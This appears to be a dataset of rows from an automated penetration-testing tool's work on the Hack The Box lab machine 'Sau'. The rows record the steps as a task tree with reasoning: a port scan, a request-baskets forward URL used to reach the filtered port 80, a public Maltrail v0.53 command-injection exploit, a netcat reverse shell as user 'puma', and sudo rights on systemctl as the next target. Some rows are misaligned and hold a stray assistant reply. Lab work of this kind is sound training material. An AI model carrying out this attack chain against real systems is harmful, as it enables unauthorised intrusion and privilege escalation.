   - Options: Hide threat, Report false positive",Do a vulnerability analysis on Maltrail (v0.53),"1. The intended task of the previous step was to manipulate the configuration of the request basket on port 55555 and further enumerate the website. This task was successfully achieved. The key findings from this step include the fact that the configuration settings of the request basket allowed for redirecting GET requests to port 80, bypassing the port filtering. This yielded a proxy response that revealed the presence of a service powered by Maltrail (v0.53) on port 80.

2. The key findings lead to the next steps in the penetration testing process. The revelation of the Maltrail service on port 80, which was previously unresponsive, is a significant discovery. Maltrail is a malicious traffic detection system, and the identified version (v0.53) could potentially have known vulnerabilities that can be exploited. 

3. Given these findings, the strategy to perform a vulnerability analysis on Maltrail (v0.53) is a logical next step. This could involve researching known vulnerabilities of this specific version of Maltrail, and if any are found, attempting to exploit them to gain unauthorized access to the system. If this strategy is successful, it could provide a way to breach the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.",Do a google search for more information,"1. The selected step is to conduct a Google search for more information on Maltrail (v0.53). This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that the service running on port 80, which was initially unresponsive, is powered by Maltrail (v0.53). Maltrail is a malicious traffic detection system, and the identified version could potentially have known vulnerabilities. 

3. Conducting a Google search is a common and effective way to gather information about known vulnerabilities of specific software versions. There are numerous online databases and forums where vulnerabilities are reported and discussed, often with links to detailed explanations and sometimes even exploit code.

4. The strategy to perform a vulnerability analysis on Maltrail (v0.53) is based on the assumption that exploiting a known vulnerability could provide a way to gain unauthorized access to the system. By conducting a Google search, we can gather more information about potential vulnerabilities and how to exploit them.

5. If this step is successful, it could lead to the identification of one or more vulnerabilities that can be exploited to breach the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.",{'Google search': 'Conduct a search for known vulnerabilities in Maltrail (v0.53)'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (to-do) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",,Do an nmap scan to find the open ports and the services.,Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.,Exploit the found exploitation to obtain a reverse shell,"1. The intended task of the previous step was to identify open ports, services running on the open ports, and their versions, and to further enumerate on the services. This task was achieved successfully. The key findings from this step were the identification of open ports (22, 80, 55555) and the services running on them. Among these, the service running on port 55555 was found to be directing to a web portal that collects HTTP requests. This web portal was powered by Maltrail (v0.53).

2. In addition to this, the vulnerability assessment revealed that the tested version of Maltrail is vulnerable to an OS command execution vulnerability, and a public exploit exists for this vulnerability. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. This key finding indicates a potential way to exploit the system.

3. Based on these findings, the logical next step would be to move forward with the same strategy of exploiting the identified vulnerability to gain unauthorized access to the system. Specifically, the strategy would be to exploit the found vulnerability to obtain a reverse shell. This would involve setting up a listener with netcat, modifying the POC to use the URL from a previous exploit, and then running the POC. If successful, this strategy could provide a reverse shell, allowing further exploration and potential control of the system.",Exploit the selected exploitation,"1. The selected step, ""Exploit the selected exploitation,"" logically follows from the findings in the Updated PTT and the strategic plan. The vulnerability assessment in the Updated PTT revealed an OS command execution vulnerability in the Maltrail service running on the target system. Moreover, a public exploit for this vulnerability was found on a GitHub repository.

2. The existence of this public exploit provides a clear path forward for exploitation. The exploit can be used as a starting point, potentially saving time and resources compared to developing a new exploit from scratch. Furthermore, the fact that this exploit is public suggests that it has been tested and proven effective by others, increasing the likelihood of success.

3. In the context of the strategic plan, exploiting the selected vulnerability aligns with the overall goal of obtaining a reverse shell. A successful exploitation of this vulnerability would allow the execution of arbitrary OS commands on the target system, which could be used to spawn a reverse shell.

4. Therefore, the selected step is to use the exploit from the GitHub repository to execute the exploit. This involves setting up a listener with netcat, modifying the exploit to use the URL from a previous exploit (as indicated by the vulnerability assessment), and running the exploit. If successful, this would provide a reverse shell and allow further exploration and potential control of the system.","{'Metasploit': 'Use the public exploit from the GitHub repository to exploit the OS command execution vulnerability.', 'Netcat': 'Set up a listener to receive the reverse shell from the target system.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (completed) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
       1.3.5 Exploit the selected exploitation - (completed) {Findings: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",Exploit the found exploitation to obtain a reverse shell,"1. The selected step, ""Exploit the selected exploitation,"" logically follows from the findings in the Updated PTT and the strategic plan. The vulnerability assessment in the Updated PTT revealed an OS command execution vulnerability in the Maltrail service running on the target system. Moreover, a public exploit for this vulnerability was found on a GitHub repository.

2. The existence of this public exploit provides a clear path forward for exploitation. The exploit can be used as a starting point, potentially saving time and resources compared to developing a new exploit from scratch. Furthermore, the fact that this exploit is public suggests that it has been tested and proven effective by others, increasing the likelihood of success.

3. In the context of the strategic plan, exploiting the selected vulnerability aligns with the overall goal of obtaining a reverse shell. A successful exploitation of this vulnerability would allow the execution of arbitrary OS commands on the target system, which could be used to spawn a reverse shell.

4. Therefore, the selected step is to use the exploit from the GitHub repository to execute the exploit. This involves setting up a listener with netcat, modifying the exploit to use the URL from a previous exploit (as indicated by the vulnerability assessment), and running the exploit. If successful, this would provide a reverse shell and allow further exploration and potential control of the system.","The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.","Search for files, commands and their previledges","1. The intended task of the previous step was to exploit the identified vulnerability to obtain a reverse shell. This task was successfully achieved. The key findings from this step were that the tester was able to exploit the vulnerability using the proof of concept (POC) from the GitHub repository, obtain a reverse shell, and connect to it using netcat. The current user of the shell is 'puma', and the present working directory is /opt/maltrail. The directory contains various files and folders.

2. These findings provide valuable information about the target system, such as the current user and the contents of the current directory. However, to gain more control over the system, it would be necessary to escalate privileges. This could potentially be achieved by exploiting weak file permissions, misconfigurations, or insecurely implemented cron jobs.

3. Therefore, the logical next step in the strategy would be to move forward with a new task: searching for files, commands (cron jobs), and their privileges. This task would involve examining the file system, identifying potentially exploitable files or commands, and checking their permissions. If any files or commands are found that can be exploited for privilege escalation, this could provide a path to gaining more control over the system. This strategy aligns with the overall goal of gaining unauthorized access to and control over the target system.","Explore the suspicious files, commands and create a summary of the findings.","1. The selected step, ""Explore the suspicious files, commands and create a summary of the findings,"" logically follows from the findings in the Updated PTT and the strategic plan. We have successfully obtained a reverse shell and now have access to the system as the 'puma' user. The current working directory contains a variety of files and folders, some of which may be exploitable for privilege escalation.

2. The strategic plan now involves searching for files, commands, and their privileges. This step is crucial for identifying potential paths for privilege escalation. If there are files with weak permissions, commands that can be run with higher privileges, or other misconfigurations, these could potentially be exploited to gain higher-level access to the system.

3. Therefore, the selected step is to explore the suspicious files and commands. This involves examining the files and commands found in the current directory, as well as potentially searching other directories. The goal is to identify any files or commands that could be exploited for privilege escalation.

4. After identifying potential targets, it's important to create a summary of the findings. This summary will serve as a reference for future steps, helping to keep track of potential paths for privilege escalation and guiding the exploitation process.

5. In conclusion, this step is a logical continuation of the strategy, aiming to gather more information about the system and identify potential paths for privilege escalation.",{'Interactive CLI': 'Create a summary of the findings related to potential privilege escalation.'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (completed) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
       1.3.5 Exploit the selected exploitation - (completed) {Findings: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}
   1.5 Search for files, commands and their privileges - (completed) {Findings: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).}
   1.6 Exploit the sudo privileges - (to-do)",,"Apologies, but it seems you've left the ""selected step"" and ""row_explanation"" fields blank. Could you please provide more information or specify the step you'd like me to explain?","The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).",Run the the /usr/bin/systemctl status trail.service command with sudo,"1. The intended task of the previous step was to search for files, commands, and their privileges. The results indicate that this task was successfully achieved. The key finding is that the 'puma' user has sudo privileges to run the '/usr/bin/systemctl status trail.service' command without requiring a password.

2. This key finding is significant because it suggests a potential path for privilege escalation. If the 'systemctl' command can be run with sudo privileges without requiring a password, it may be possible to exploit this to gain unauthorized access to and control over the system. However, it was also found that 'systemctl' may not be correctly installed or accessible in the current environment, which could potentially hinder this path for privilege escalation.

3. Given these findings, it would be logical to move forward with the strategy of exploiting the sudo privileges. Specifically, the next step should be to run the '/usr/bin/systemctl status trail.service' command with sudo. This could potentially reveal more information about the system or uncover a vulnerability that could be exploited for privilege escalation. This aligns with the overall goal of gaining unauthorized access to and control over the system.",Exploit the selected exploitation,"The selected step is to exploit the identified vulnerability where the 'puma' user has sudo privileges to run the '/usr/bin/systemctl status trail.service' command without requiring a password. 

The Chain-of-thoughts for this step is as follows:

1. From the previous step, we have identified that the 'puma' user has sudo privileges for a specific command. This is a significant finding as it provides a potential avenue for privilege escalation.

2. The 'systemctl' command is a system utility in Linux that is used to inspect and control the state of the ""systemd"" system and service manager. If the 'puma' user can run this command with sudo privileges without requiring a password, it could potentially be exploited to gain unauthorized access to and control over the system.

3. However, it was also found that 'systemctl' may not be correctly installed or accessible in the current environment. This could potentially hinder the exploitation process, but it is still worth attempting due to the potential high impact of success.

4. Therefore, following the strategy, the next logical step is to run the '/usr/bin/systemctl status trail.service' command with sudo to see if it reveals more information or uncovers a vulnerability that could be exploited. This aligns with the overall goal of gaining unauthorized access to and control over the system.","{'Metasploit': ""Attempt to exploit the sudo privileges of the 'puma' user by executing '/usr/bin/systemctl status trail.service' command.""}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (completed) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
       1.3.5 Exploit the selected exploitation - (completed) {Findings: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}
   1.5 Search for files, commands and their privileges - (completed) {Findings: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).}
   1.6 Exploit the sudo privileges - (completed) {Findings: The command 'sudo /usr/bin/systemctl status trail.service' was run by the user 'puma' on the system 'sau'. The output shows that 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The documentation for the service can be found at https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22) with a hybrid default hierarchy.}
   1.7 Further exploit the system - (to-do)",Run the the /usr/bin/systemctl status trail.service command with sudo,"The selected step is to exploit the identified vulnerability where the 'puma' user has sudo privileges to run the '/usr/bin/systemctl status trail.service' command without requiring a password. 

The Chain-of-thoughts for this step is as follows:

1. From the previous step, we have identified that the 'puma' user has sudo privileges for a specific command. This is a significant finding as it provides a potential avenue for privilege escalation.

2. The 'systemctl' command is a system utility in Linux that is used to inspect and control the state of the ""systemd"" system and service manager. If the 'puma' user can run this command with sudo privileges without requiring a password, it could potentially be exploited to gain unauthorized access to and control over the system.

3. However, it was also found that 'systemctl' may not be correctly installed or accessible in the current environment. This could potentially hinder the exploitation process, but it is still worth attempting due to the potential high impact of success.

4. Therefore, following the strategy, the next logical step is to run the '/usr/bin/systemctl status trail.service' command with sudo to see if it reveals more information or uncovers a vulnerability that could be exploited. This aligns with the overall goal of gaining unauthorized access to and control over the system.","The command 'sudo /usr/bin/systemctl status trail.service' was run by the user 'puma' on the system 'sau'. The output shows that 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The documentation for the service can be found at https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22) with a hybrid default hierarchy.",Do a vulnerability analysis on systemd 245 (245.4-4ubuntu3.22),"1. The intended task of the previous step was to exploit the sudo privileges of the 'puma' user to run the '/usr/bin/systemctl status trail.service' command. The results indicate that this task was successfully achieved. The key finding is that the 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22).

2. This key finding is significant because it provides more information about the system and its services. The 'systemctl' command provides control over the systemd system and service manager, which is a fundamental part of the Linux operating system. Knowing the exact version of 'systemctl' that is running on the system can help identify potential vulnerabilities that could be exploited for further privilege escalation.

3. Given these findings, it would be logical to move forward with the strategy of conducting a vulnerability analysis on systemd 245 (245.4-4ubuntu3.22). This could potentially reveal vulnerabilities that could be exploited to gain further unauthorized access to and control over the system. The overall goal of gaining unauthorized access to and control over the system remains the same, but the strategy has shifted to focus on exploiting potential vulnerabilities in 'systemctl'.",Do a google search for more information,"The selected step is to perform a Google search for more information on any known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and detailed explanations on how to exploit them.

The Chain-of-thoughts for this step is as follows:

1. From the previous step, we have identified that the version of 'systemctl' running on the system is systemd 245 (245.4-4ubuntu3.22). This is a significant finding as it provides a potential avenue for privilege escalation if any known vulnerabilities exist for this version.

2. The 'systemctl' command provides control over the systemd system and service manager, a critical component of the Linux operating system. If there are any known vulnerabilities for the identified version, it could potentially be exploited to gain unauthorized access to and control over the system.

3. Therefore, the next logical step is to perform a Google search to find more information on any known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and detailed explanations on how to exploit them. This aligns with the overall goal of gaining unauthorized access to and control over the system and builds upon the strategy of exploiting potential vulnerabilities in 'systemctl'. 

4. The information obtained from the Google search will help in formulating the next steps in the penetration testing process, specifically in the exploitation of identified vulnerabilities.",{'Google search': 'Search for known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and exploitation methods.'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (completed) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
       1.3.5 Exploit the selected exploitation - (completed) {Findings: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}
   1.5 Search for files, commands and their privileges - (completed) {Findings: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).}
